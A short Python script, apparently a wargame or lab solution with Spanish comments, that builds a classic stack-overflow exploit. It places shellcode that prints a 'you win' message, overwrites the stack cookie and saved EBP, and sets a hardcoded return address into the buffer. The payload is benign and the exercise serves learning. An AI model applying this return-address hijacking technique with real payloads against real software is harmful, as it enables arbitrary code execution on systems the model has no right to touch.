# payload.py
from struct import pack
# shellcode, imprime you win!
shellcode = "\xeb\x11\x59\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x10\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xea\xff\xff\xff\x67\x61\x6e\x61\x73\x74\x65\x20\x70\x61\x6c\x6f\x6d\x61\x21\x0b"
ret_addr = 0xbffff5ec # Direccion de buf
output = ""  # nops iniciales buf
output += shellcode # shellcode

output += "BBBB" # lleno cookie
output += "CCCC" # lleno ebp
output += pack("<I", ret_addr) # defino return address
print(output)